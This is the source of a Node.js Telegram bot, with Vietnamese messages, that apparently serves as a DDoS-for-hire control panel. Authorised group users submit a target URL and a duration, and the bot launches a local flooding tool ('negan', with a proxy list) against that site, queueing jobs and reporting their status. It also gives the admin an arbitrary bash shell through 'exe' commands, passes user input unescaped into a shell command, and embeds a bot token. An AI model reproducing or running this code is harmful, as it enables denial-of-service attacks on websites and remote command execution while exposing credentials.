const TelegramBot=require('node-telegram-bot-api'),{exec}=require('child_process'),token='7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU',adminId=1243471275,allowedGroupIds=new Set([-1002423723717,-1002334544605,112233445,556677889,998877665]),bot=new TelegramBot(token,{polling:true}),maxSlot=1,maxCurrent=3,maxTimeAttacks=120;
let currentProcesses=0,queue=[],userProcesses={},activeAttacks={};

const restartBot=()=>{console.error('🚨 Restarting bot...');bot.stopPolling();setTimeout(()=>{bot=new TelegramBot(token,{polling:true});initBot()},1000)},
initBot=()=>{
bot.sendMessage(adminId,'[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');
const helpMessage=`📜 Hướng dẫn sử dụng:\n➔ Lệnh chính xác: <code>https://example.com 60</code>\n⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;

bot.on('message',async msg=>{
const {chat:{id:chatId},text,from:{id:userId,username,first_name}}=msg,isAdmin=chatId===adminId,isGroup=allowedGroupIds.has(chatId),caller=username||first_name;
if(!isAdmin&&!isGroup)return bot.sendMessage(chatId,'❌ Bạn không có quyền sử dụng liên hệ: @NeganSSHConsole.',{parse_mode:'HTML'});
if(!text||!['http://','https://','exe ','/help'].some(cmd=>text.startsWith(cmd)))return;
if(text==='/help')return bot.sendMessage(chatId,helpMessage,{parse_mode:'HTML'});

if(text.startsWith('http')){
const[host,time]=text.split(' ');
if(!host||isNaN(time))return bot.sendMessage(chatId,'🚫 Sai định dạng! Nhập theo: <code>https://example.com 60</code>.',{parse_mode:'HTML'});
const attackTime=Math.min(parseInt(time,10),maxTimeAttacks);
if(userProcesses[userId]>=maxSlot){
const remaining=Math.ceil((Object.values(activeAttacks).find(a=>a.userId===userId)?.endTime-Date.now())/1000);
if(remaining>0)return bot.sendMessage(chatId,`❌ Bạn đang có tiến trình chạy! Còn lại: ${remaining} giây!`);}
if(currentProcesses>=maxCurrent){queue.push({userId,host,time:attackTime,chatId,caller});return bot.sendMessage(chatId,'⏳ Yêu cầu được đưa vào hàng đợi...',{parse_mode:'HTML'});}

const pid=Math.floor(Math.random()*10000),endTime=Date.now()+attackTime*1000;
activeAttacks[pid]={userId,endTime};userProcesses[userId]=(userProcesses[userId]||0)+1;currentProcesses++;

const startMessage=JSON.stringify({
Status:"✨🚀🛸 Successfully 🛸🚀✨",
Caller:caller,
"PID Attack":pid,
Website:host,
Time:`${attackTime} Giây`,
Maxslot:maxSlot,
Maxtime:maxTimeAttacks,
ConcurrentAttacks:currentProcesses,
StartTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'}),
CheckHostURL:`Check Host (https://check-host.net/check-http?host=${host})`,
HostTracker:`Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
},null,2);

await bot.sendMessage(chatId,startMessage,{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'Check Host',url:`https://check-host.net/check-http?host=${host}`},{text:'Host Tracker',url:`https://www.host-tracker.com/en/ic/check-http?url=${host}`}]]}});

exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`,{shell:'/bin/bash'},(e,stdout,stderr)=>{
const completeMessage=JSON.stringify({Status:"👽 END ATTACK 👽",Caller:caller,"PID Attack":pid,Website:host,Time:`${attackTime} Giây`,EndTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2);
bot.sendMessage(chatId,completeMessage,{parse_mode:'HTML'});
delete activeAttacks[pid];userProcesses[userId]--;currentProcesses--;
if(queue.length){const next=queue.shift();bot.sendMessage(next.chatId,`📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);bot.emit('message',{chat:{id:next.chatId},from:{id:next.userId,username:next.caller},text:`${next.host} ${next.time}`);}
});return;}

if(text.startsWith('exe ')&&isAdmin){
const cmd=text.slice(4);if(!cmd)return bot.sendMessage(chatId,'🚫 Lệnh không được trống! VD: <code>exe ls</code>',{parse_mode:'HTML'});
exec(cmd,{shell:'/bin/bash'},(e,o,er)=>bot.sendMessage(chatId,`🚀 Kết quả lệnh:\n<pre>${cmd}\n${o||er}</pre>`,{parse_mode:'HTML'}));}
});

bot.on('polling_error',restartBot);
process.on('uncaughtException',restartBot);
process.on('unhandledRejection',restartBot);}

initBot();
